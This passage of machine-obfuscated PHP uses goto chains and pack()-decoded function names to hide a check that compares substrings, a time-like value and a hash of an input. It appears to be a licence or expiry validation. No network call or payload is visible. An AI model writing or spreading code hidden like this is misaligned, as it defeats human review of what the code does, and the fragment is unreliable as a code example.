Q24xcj;Q24ldMhxck:$Q24ACV1=$GLOBALS[FFVQF4FQ][3];Q24xcj:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24P0=E_CORE_ERROR*51;$Q24P1=$Q24P0-816;$Q24P2=62*E_CORE_ERROR;$Q24P3=$Q24P2-992;$Q24P4=$Q24P3-1318;$Q24P5=E_CORE_ERROR*83;$Q24P6=$Q24P4+$Q24P5;$Q247=E_CORE_ERROR*51;$Q248=$Q247-816;$Q249=$GLOBALS[$Q24F0]($L5O41U4v,$Q24P1,$Q24P6)==$Q248;$Q2421=(bool)$Q249;$Q2438=!$Q2421;if($Q2438)goto Q24eWjgxcw;goto Q24ldMhxcw;Q24eWjgxcw:unset($Q24ACV4);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxcm;goto Q24ldMhxcm;Q24eWjgxcm:$Q24ACV4=&$GLOBALS[FFVQF4FQ][3];goto Q24xcl;Q24ldMhxcm:$Q24ACV4=$GLOBALS[FFVQF4FQ][3];Q24xcl:$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV4));$Q24P10=E_CORE_ERROR*51;$Q24P11=$Q24P10-816;$Q24P12=62*E_CORE_ERROR;$Q24P13=$Q24P12-992;$Q24P14=$Q24P13-1318;$Q24P15=E_CORE_ERROR*83;$Q24P16=$Q24P14+$Q24P15;$Q24F6=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x9}));$Q2417=$GLOBALS[$Q24F3]($L5O41U4v,$Q24P11,$Q24P16)-$GLOBALS[$Q24F6]();$Q2418=E_CORE_ERROR*51;$Q2419=$Q2418-816;$Q2420=$Q2417>$Q2419;$Q2421=(bool)$Q2420;goto Q24xcv;Q24ldMhxcw:Q24xcv:$Q2437=(bool)$Q2421;if($Q2437)goto Q24eWjgxcu;goto Q24ldMhxcu;Q24eWjgxcu:unset($Q24ACV8);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxco;goto Q24ldMhxco;Q24eWjgxco:$Q24ACV8=&$GLOBALS[FFVQF4FQ][3];goto Q24xcn;Q24ldMhxco:$Q24ACV8=$GLOBALS[FFVQF4FQ][3];Q24xcn:$Q24F7=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV8));$Q24P22=62*E_CORE_ERROR;$Q24P23=$Q24P22-992;$Q24P24=$Q24P23-1318;$Q24P25=E_CORE_ERROR*83;$Q24P26=$Q24P24+$Q24P25;$Q24P27=E_CORE_ERROR*37;$Q24P28=$Q24P27-576;unset($Q24ACV11);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxcq;goto Q24ldMhxcq;Q24eWjgxcq:$Q24ACV11=&$GLOBALS[FFVQF4FQ][3];goto Q24xcp;Q24ldMhxcq:$Q24ACV11=$GLOBALS[FFVQF4FQ][3];Q24xcp:$Q24F10=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV11));$Q24F13=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));unset($Q24ACV15);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxcs;goto Q24ldMhxcs;Q24eWjgxcs:$Q24ACV15=&$GLOBALS[FFVQF4FQ][3];goto Q24xcr;Q24ldMhxcs:$Q24ACV15=$GLOBALS[FFVQF4FQ][3];Q24xcr:$Q24F14=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV15));$Q24P29=E_CORE_ERROR*8;$Q24P30=$Q24P29-102;$Q24P31=$GLOBALS[$Q24F14]($L5O41U4v,$Q24P30) . $VE0948YQ;$Q24P32=E_CORE_ERROR*51;$Q24P33=$Q24P32-816;$Q24P34=E_CORE_ERROR*37;$Q24P35=$Q24P34-576;$Q2436=$GLOBALS[$Q24F7]($L5O41U4v,$Q24P26,$Q24P28)==$GLOBALS[$Q24F10]($GLOBALS[$Q24F13]($Q24P31),$Q24P33,$Q24P35);$Q2437=(bool)$Q2436;goto Q24xct;Q24ldMhxcu:Q24xct:if($Q2437)goto Q24eWjgxcx;goto Q24ldMhxcx;Q24eWjgxcx:unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxdz;goto Q24ldMhxdz;Q24eWjgxdz:$Q24ACV1=&$GLOBALS[FFVQF4FQ][3];goto Q24xcy;Q24ldMhxdz:$Q24ACV1=$GLOBALS[FFVQF4FQ][3];Q24xcy:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24P0=E_CORE_ERROR*8;$Q24P1=$Q24P0-102;return $GLOBALS[$Q24F0]($L5O41U4v,$Q24P1);goto Q24xci;Q24ldMhxcx:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{031}));return $Q24F0;Q24xci:goto Q24xcg;Q24ldMhxch:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0xF}));unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxd2;goto Q24ldMhxd2;Q24eWjgxd2:$Q24ACV2=&$GLOBALS[FFVQF4FQ][0x1B];goto Q24xd1;Q24ldMhxd2:$Q24ACV2=$GLOBALS[FFVQF4FQ][0x1B];Q24xd1:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));$Q24F4=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{031}));unset($Q24ACV6);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxd4;goto Q24ldMhxd4;Q24eWjgxd4:$Q24ACV6=&$GLOBALS[FFVQF4FQ][0x11];goto Q24xd3;Q24ldMhxd4:$Q24ACV6=$GLOBALS[FFVQF4FQ][0x11];Q24xd3:$Q24F5=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV6));$Q240=$CF2JKAXJ . $GLOBALS[$Q24F0]($Q24F1,$Q24F4,$GLOBALS[$Q24F5]($L5O41U4v));return $Q240;Q24xcg:}
?>